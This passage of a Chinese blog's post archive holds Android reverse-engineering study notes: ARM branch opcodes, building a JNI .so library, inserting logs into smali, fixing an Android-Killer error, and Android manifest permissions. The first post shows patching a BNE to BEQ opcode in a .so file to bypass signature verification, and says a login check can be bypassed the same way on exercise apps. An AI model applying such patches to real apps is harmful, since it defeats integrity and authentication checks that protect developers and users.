class="code"><pre><span class="line">B指令</span><br><span class="line">  格式：`B&#123;条件&#125; 目标地址`</span><br><span class="line">  解释：B指令是最简单的跳转指令。一旦遇到一个B指令，ARM处理器将立即跳转到给定的目标地址，从那里继续执行。注意存储在`跳转指令中的实际值是相对当前PC 值的一个偏移量，而不是一个绝对地址`，它的值由汇编器来计算（参考寻址方式中的相对寻址）。它是24位有符号数，左移两位后有符号扩展为32 位，表示的有效偏移为26 位(前后32MB的地址空间)。以下指令：</span><br><span class="line">  示例：</span><br><span class="line">    B    Label      //程序无条件跳转到标号Label处执行</span><br><span class="line">    CMP R1，＃0     //当CPSR寄存器中的Z条件码置位时，程序跳转到标号Label处执行</span><br><span class="line">    BEQ Label    </span><br></pre></td></tr></table></figure><p>再对照条件码表</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203110701674.png" alt="image-20210203110701674"></p><p>我们可以得到指令对应的机器码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BNE 1101 0001</span><br><span class="line">BEQ 1101 0000</span><br></pre></td></tr></table></figure><p>这样一看就清晰明了了，此例中对应的二进制居然是数据在前，指令在后的。故修改时应将<code>1101 0001</code>改为<code>1101 0000</code>即为<code>D1</code>改为<code>D0</code></p><p>cpu指令必然是操作码在前，数据在后。只不过是ida hex视图显示下，16进制高位在右，低位在左。所以看起来是反过来了，但实际上书写的时候操作码是在高位的。所有的16进制编辑器都是这样显示的。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>ida pro 反汇编 Android SO库(armeabi版本) ，一条汇编指令如果由4个十六进制数组成的，so库的指令格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一条SO的汇编指令(16位) = 操作码(前8位) ：操作数(后8位)</span><br></pre></td></tr></table></figure><hr><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210203113643245.png" alt="image-20210203113643245"></p><p>修改后即可绕过签名验证</p><p>后续作业绕过登录验证的代码也在so中，修改思路大致相同，同样是更改判断语句的条件。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对arm的原生逆向比对smali的逆向要困难的多。理解各种指令的使用方法才能更好的理解程序并做出修改。</p><p>Arm指令转16进制速查可使用<a href="http://armconverter.com/">Arm汇编指令转机器码网站：http://armconverter.com/</a>但是ida pro反编译SO库用的是 Thumb-2 指令集，这个指令集是 arm 指令集的子集。转码网站似乎不在支持Thumb-2指令集，只有一个Thumb选项，和ida pro反编译的内容略有差别。</p><blockquote><p>参考资料<br><a href="https://www.52pojie.cn/thread-732955-1-1.html">https://www.52pojie.cn/thread-732955-1-1.html</a><br>《Android软件安全与逆向分析》<br><a href="https://blog.csdn.net/fuchaosz/article/details/104804026">https://blog.csdn.net/fuchaosz/article/details/104804026</a><br>感谢CSDN博主“梧桐那时雨”的文章，我十分敬佩他对问题钻研的态度</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向学习笔记|用AndroidStudio编写第一个so</title>
      <link href="/AS-write-so.html"/>
      <url>/AS-write-so.html</url>
      
        <content type="html"><![CDATA[<p><strong>用AndroidStudio编写第一个so</strong></p><p>so就像Windows中的dll文件，是二进制程序，只保留调用接口。用C/C++实现</p><p>Android开发中，我们经常会用到.so文件。原因有很多，比如部分方法不想暴露，如加密规则。比如部分秘钥需要存储，哪怕最简单的一个String我们使用.so调用获取这个String，也比直接明文写在代码中要来的安全。</p><p>关于NDK与JNI的资料：<a href="https://www.jianshu.com/p/87ce6f565d37">https://www.jianshu.com/p/87ce6f565d37</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>吾爱破解上虽然是2018年的教程，但是Android studio和Java实在更新太快，很多步骤不再适用，踩了很多坑。下面将复现使用AS编写so并调用，顺便完成课后作业。</p><p>编写so并在里面实现一个加法的功能<br>最终效果:java层调用so中的Add方法，传入两个参数22和30，通过log显示出来52</p><h4 id="新建项目，新建一个Java类声明native方法"><a href="#新建项目，新建一个Java类声明native方法" class="headerlink" title="新建项目，新建一个Java类声明native方法"></a>新建项目，新建一个Java类声明native方法</h4><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201113022626.png" alt="image-20210201113022626"></p><h4 id="生成-h头文件"><a href="#生成-h头文件" class="headerlink" title="生成.h头文件"></a>生成.h头文件</h4><p>在app/src/main文件夹下新建一个jni文件夹，然后打开Android Studio的终端，cd到这个目录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">GitHub</span>\<span class="title">AndroidStudioProjects</span>\<span class="title">secondso</span>\<span class="title">app</span>\<span class="title">src</span>\<span class="title">main</span>\<span class="title">jni</span>&gt;<span class="title">javac</span> -<span class="title">h</span> . <span class="title">D</span>:\<span class="title">GitHub</span>\<span class="title">AndroidStudioProjects</span>\<span class="title">secondso</span>\<span class="title">app</span>\<span class="title">src</span>\<span class="title">main</span>\<span class="title">java</span>\<span class="title">com</span>\<span class="title">luc</span></span></span><br><span class="line"><span class="function"><span class="title">kyfuture</span>\<span class="title">secondso</span>\<span class="title">MysecondJni.java</span></span></span><br></pre></td></tr></table></figure><blockquote><p>Java新版本用Javac -h代替了Javah，其实并不用上一步生成.class文件，可直接对.java进行编译</p></blockquote><p>会在这个jni文件夹下生成一个.h文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201114831206.png" alt="image-20210201114831206"></p><h4 id="在jni目录下新建一个c-c-source-file-实现上面-h文件中的方法"><a href="#在jni目录下新建一个c-c-source-file-实现上面-h文件中的方法" class="headerlink" title="在jni目录下新建一个c/c++source file ,实现上面.h文件中的方法"></a>在jni目录下新建一个c/c++source file ,实现上面.h文件中的方法</h4><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201115711734.png" alt="image-20210201120000427"></p><p>这里因为对JNI不熟悉，代码写的不对。详细资料：<a href="https://www.cnblogs.com/qixingchao/p/11911787.html">https://www.cnblogs.com/qixingchao/p/11911787.html</a></p><h4 id="在jni文件夹下新建Android-mk和Application-mk文件"><a href="#在jni文件夹下新建Android-mk和Application-mk文件" class="headerlink" title="在jni文件夹下新建Android.mk和Application.mk文件"></a>在jni文件夹下新建Android.mk和Application.mk文件</h4><p>Android.mk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE := MysecondJni</span><br><span class="line">LOCAL_SRC_FILES := main.c</span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure><p>Application.mk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP_ABI := all</span><br></pre></td></tr></table></figure><h4 id="关联下载好的ndk包"><a href="#关联下载好的ndk包" class="headerlink" title="关联下载好的ndk包"></a>关联下载好的ndk包</h4><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201120000427.png" alt="image-20210201115711734"></p><p>下载地址 <a href="https://developer.android.com/ndk/downloads/index.html">https://developer.android.com/ndk/downloads/index.html</a></p><h4 id="进入到jni目录，输入指令-ndk-build-生成相应的so文件"><a href="#进入到jni目录，输入指令-ndk-build-生成相应的so文件" class="headerlink" title="进入到jni目录，输入指令 ndk-build,生成相应的so文件"></a>进入到jni目录，输入指令 ndk-build,生成相应的so文件</h4><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201120318216.png" alt="image-20210201123335057"></p><h4 id="调用so文件"><a href="#调用so文件" class="headerlink" title="调用so文件"></a>调用so文件</h4><p>在app的bulid文件中加入如下代码，然后build project</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201121621582.png" alt="image-20210201120318216"></p><h4 id="在mainactivity中调用so方法"><a href="#在mainactivity中调用so方法" class="headerlink" title="在mainactivity中调用so方法"></a>在mainactivity中调用so方法</h4><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210201123335057.png" alt="image-20210201121621582"></p><p>调用so方法成功</p><h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><blockquote><p><strong>javah : 无法将“javah”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次</strong></p></blockquote><p>如果你环境变量已加好，各种方法都试过，还是出现上述问题，那很可能是用的jdk版本比较高。<br><strong>新版JDK已经用javac -h 来代替javah</strong></p><blockquote><p>The option ‘android.useDeprecatedNdk’ is deprecated.</p></blockquote><p>这条提醒简直就是在套娃。新版本中ndk支持使用cmake和ndk-build实现，具体参考例子中的步骤。</p><blockquote><p>logcat   read: unexpected EOF!</p></blockquote><p>运行之后之后logcat一直显示这个没反应，原因是logcat缓存爆了。在logcat中右键clear logcat就好了</p><blockquote><p>参考资料：</p><p><a href="https://blog.csdn.net/leilifengxingmw/article/details/71598687">https://blog.csdn.net/leilifengxingmw/article/details/71598687</a></p><p><a href="https://www.52pojie.cn/thread-706568-1-1.html">https://www.52pojie.cn/thread-706568-1-1.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android NDK </tag>
            
            <tag> so </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向学习笔记|在smali中插入log</title>
      <link href="/log-in-smali.html"/>
      <url>/log-in-smali.html</url>
      
        <content type="html"><![CDATA[<h3 id="在smali中插入log"><a href="#在smali中插入log" class="headerlink" title="在smali中插入log"></a>在smali中插入log</h3><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210130190952786.png" alt="image-20210130190952786"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const-string v3, <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">const-string v4, <span class="string">&quot;\u6211\u662f\u6dfb\u52a0\u7684smali\u4ee3\u7801&quot;</span>   </span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v3, v4&#125;, Landroid/util/Log;-&gt;i(Ljava/lang/String;Ljava/lang/String;)I</span><br></pre></td></tr></table></figure><p>在smali中插入log时，插入的位置，以及变量的值似乎是有要求的。随意插入会导致逻辑运行出错，程序原有的log无法打印。使用除了v和p之外的变量名，编译不通过。在此例使用p作为变量名，程序运行闪退。</p><h3 id="打印变量的值"><a href="#打印变量的值" class="headerlink" title="打印变量的值"></a>打印变量的值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;p0&#125;, Lcom/luckyfuture/logtosmali/MainActivity;-&gt;fun1()I</span><br><span class="line"># 调用fun1()方法，无参数，返回值类型为<span class="type">int</span></span><br><span class="line">   move-result p1</span><br><span class="line"># 将上一步函数调用的返回值赋值给p1</span><br><span class="line">   invoke-<span class="keyword">static</span> &#123;p1&#125;, Ljava/lang/String;-&gt;valueOf(I)Ljava/lang/String;</span><br><span class="line"># 调用valueof(I)方法，一个参数为Int类型，返回值为String</span><br><span class="line">   move-result-object p1</span><br><span class="line">   # 将上一步方法调用对象引用返回值到p1，对于返回值为String要这么写，因为String不是基本数据类型</span><br><span class="line"></span><br><span class="line">   const-string v0, <span class="string">&quot;\u8fd9\u4e2a\u503c\u662f&quot;</span></span><br><span class="line"></span><br><span class="line">   invoke-<span class="keyword">static</span> &#123;v0, p1&#125;, Landroid/util/Log;-&gt;i(Ljava/lang/String;Ljava/lang/String;)I</span><br><span class="line">   # 调用log.i方法，两个参数都为String，返回值为<span class="type">int</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210130191025828.png" alt="image-20210130191025828"></p><p>插入log时要注意寄存器变量的名称，插入log更改寄存器中的值时，可能会影响到程序原本的运行。</p><p>不仅如此，使用寄存器时名称也有限制，本例中必须使用v2才能正确运行，使用其它名称闪退，可能是与smali性质有关。</p><h3 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h3><p>插入log时，寄存器变量名使用有无限制；对于不同数据类型，寄存器使用有无限制；寄存器的数量有多少，名称分别是什么？</p><ul><li>两种不同的寄存器表示方法，v命名法和p命名法</li></ul><p>v命名法：寄存器命名从v0开始，表示函数中用到的局部变量与参数</p><p>p命名法：对函数的局部变量寄存器命名没有影响，函数中引用的参数的命名从p0开始，局部变量寄存器仍然用v表示。</p><p>使用p命名法更容易判断寄存器到底是局部变量寄存器还是参数寄存器，优势更明显。smali语法使用p命名法。</p><ul><li>Dalvik寄存器</li></ul><p>Dalvik虚拟机基于寄存器架构，在ARM架构的CPU上运行，Dalvik将部分寄存器映射到ARM处理器的寄存器上，还有一部分通过调用栈进行虚拟。最多有16位，2的16次方，65536个寄存器。v0——v65535</p><ul><li>不同数据类型和寄存器的关系</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20210130191043704.png" alt="image-20210130191043704"></p><blockquote><p>参考资料</p><p><a href="https://www.52pojie.cn/thread-665362-1-1.html">https://www.52pojie.cn/thread-665362-1-1.html</a></p><p>《Android软件安全与逆向分析》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android-Killer-Mainactivity.smali文件已丢失，无法执行打开操作解决</title>
      <link href="/Android-Killer.html"/>
      <url>/Android-Killer.html</url>
      
        <content type="html"><![CDATA[<p>准备开始学习安卓逆向，在Android-Killer的使用上遇到了问题。</p><p>我使用Android-Studio生成了一个apk，准备用Android-Killer进行反编译。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121175650912.png" alt="image-20210121175650912"></p><p>拖进Android-Killer后，一直报<code>mainactivity.smali</code>文件已丢失，无法执行打开操作这个错误。刚开始以为是jdk版本的问题，换成了教程里的jdk1.7这个问题仍然存在。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121175923221.png" alt="image-20210121175800897"></p><p>但是在反编译生成的文件中，可以看到<code>mainactivity.smali</code>文件是存在的。</p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121175800897.png" alt="image-20210121175923221" style="zoom: 50%;" /><p>网上有人说这是Android-Studio 2.0以上的Instant Run功能，帮助开发者快速调试代码。因此AS生成的debug版本apk文件与release版本的apk目录项目不同。但是AS 4.0中已经找不到Instant Run这个选项了。</p><p>那索性就直接生成release版本的apk好了，build -&gt;  Geberate signed apk</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121191935718.png" alt="image-20210121191935718"></p><p>选择一个加密密钥，没有就生成一个</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121191957191.png" alt="image-20210121191957191"></p><p>生成release版本</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121192041000.png" alt="image-20210121192041000"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121192134849.png" alt="image-20210121192134849"></p><p>用Android Killer打开，可以正常反编译以及重打包签名</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210121192236833.png" alt="image-20210121192236833"></p><p>此解决方法的缺点是AS生成release版本apk的速度远不如debug版本快。</p><p>环境搭建参考</p><blockquote><p><a href="https://www.52pojie.cn/thread-844248-1-1.html">https://www.52pojie.cn/thread-844248-1-1.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Android-Killer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AndroidManifest中权限讲解</title>
      <link href="/AndroidManifest.html"/>
      <url>/AndroidManifest.html</url>
      
        <content type="html"><![CDATA[<p>权限的作用是保护 Android 用户的隐私。<strong>Android 应用必须请求权限才能访问敏感用户数据</strong>（例如联系人和短信）以及某些系统功能（例如相机和互联网）。系统可能会自动授予权限，也可能会提示用户批准请求，具体取决于访问的功能。</p><p>Android 安全架构的设计主旨是：<strong>在默认情况下任何应用都没有权限执行会对其他应用、操作系统或用户带来不利影响的任何操作。</strong>这包括读取或或写入用户的私有数据（例如联系人或电子邮件）、读取或写入其他应用的文件、执行网络访问、使设备保持唤醒状态等。</p><p>Android应用申请的权限在AndroidManifest.xml文件中可以查看</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210111222721080.png" alt="image-20210111222721080"></p><p>如要访问敏感用户数据（如联系人和短信）或某些系统功能（如相机和互联网访问），则 Android 应用必须请求相关权限。</p><h3 id="lt-uses-permission-gt"><a href="#lt-uses-permission-gt" class="headerlink" title="&lt;uses-permission&gt;"></a>&lt;uses-permission&gt;</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">...</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span>/&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>指定用户必须授予的系统权限，以便应用正常运行。</p><p>从 Android 6.0（API 级别 23）开始，用户可以在运行时同意或拒绝某些应用权限。 但是，无论您的应用支持哪个 Android 版本，您都必须使用清单中的 <code>&lt;uses-permission&gt;</code> 元素声明所有权限请求。 授予应用权限后，该应用便能使用受保护的功能。 否则，该应用在尝试访问这些功能时会失败。</p><p>如果您的应用在清单中列出普通权限（即不会给用户隐私或设备操作带来太大风险的权限），系统会<strong>自动将这些权限授予应用</strong>。</p><p>如果您的应用在清单中列出危险权限（即可能影响用户隐私或设备正常操作的权限），如上面的 <code>SEND_SMS</code> 权限，必须<strong>由用户明确同意授予</strong>这些权限。</p><h3 id="危险权限的请求提示"><a href="#危险权限的请求提示" class="headerlink" title="危险权限的请求提示"></a>危险权限的请求提示</h3><p>如果设备搭载的是 Android 6.0（API 级别 23）或更高版本。当应用请求权限时，用户会看到一个系统对话框，告知用户应用正在尝试访问的权限组。该对话框包括<strong>拒绝</strong>和<strong>允许</strong>按钮。</p><img src= "/img/loading.gif" data-lazy-src="https://developer.android.com/images/permissions/runtime_permission_request_2x.png" alt="img" style="zoom:50%;" /><p>如果设备搭载的是 Android 5.1.1（API 级别 22）或更低版本，系统将在安装时自动请求用户向应用授予所有危险权限，如果用户点击<strong>接受</strong>，系统将授予应用请求的所有权限。如果用户拒绝权限请求，系统将<strong>取消应用安装</strong>。</p><p>如果应用更新包括额外权限需求，系统会在更新应用之前提示用户接受这些新权限。</p><img src= "/img/loading.gif" data-lazy-src="https://developer.android.com/images/permissions/install_time_permissions_dialog_2x.png" alt="img" style="zoom:50%;" /><h3 id="保护级别"><a href="#保护级别" class="headerlink" title="保护级别"></a>保护级别</h3><p>保护级别影响着<strong>是否需要运行时权限请求</strong>。</p><h4 id="普通权限"><a href="#普通权限" class="headerlink" title="普通权限"></a>普通权限</h4><p>普通权限涵盖以下情况：应用需要访问其沙盒外部的数据或资源，但对用户隐私或其他应用的操作带来的风险很小。例如，设置时区的权限就是普通权限。</p><p>如果应用在清单中声明需要普通权限，系统会在安装时自动向应用授予该权限。系统不会提示用户授予普通权限，用户也无法撤消这些权限。</p><h4 id="签名权限"><a href="#签名权限" class="headerlink" title="签名权限"></a>签名权限</h4><p>系统在安装时授予这些应用权限，但仅会在尝试使用某权限的应用签名证书为定义该权限的同一证书时才会授予。</p><p><strong>注意</strong>：有些签名权限不适合第三方应用使用。</p><h4 id="危险权限"><a href="#危险权限" class="headerlink" title="危险权限"></a>危险权限</h4><p>危险权限涵盖以下情况：应用需要的数据或资源涉及用户隐私信息，或者可能对用户存储的数据或其他应用的操作产生影响。例如，能够读取用户的联系人属于危险权限。如果应用声明其需要危险权限，必须由用户向应用明确授予该权限。在用户批准该权限之前，应用无法提供依赖于该权限的功能。</p><p>为了使用危险权限，应用必须在运行时提示用户授予权限。</p><h3 id="Manifest-permission列表"><a href="#Manifest-permission列表" class="headerlink" title="Manifest.permission列表"></a>Manifest.permission列表</h3><p>Android的开发者文档中列举了所有的权限的用途描述和保护级别。</p><p><a href="https://developer.android.com/reference/android/Manifest.permission">https://developer.android.com/reference/android/Manifest.permission</a></p><p>我将其中的数据爬取并生成了<a href="https://github.com/luckyfuture0177/AndroidManifest-permission/blob/main/permission_list.yml"><code>permission_list.yml</code></a>文件，以便能快速获取相关权限的信息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/luckyfuture0177/imagebed/raw/master/image/2021/01/image-20210111222444908.png" alt="image-20210111222444908"></p><p><a href="https://github.com/luckyfuture0177/AndroidManifest-permission">https://github.com/luckyfuture0177/AndroidManifest-permission</a></p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
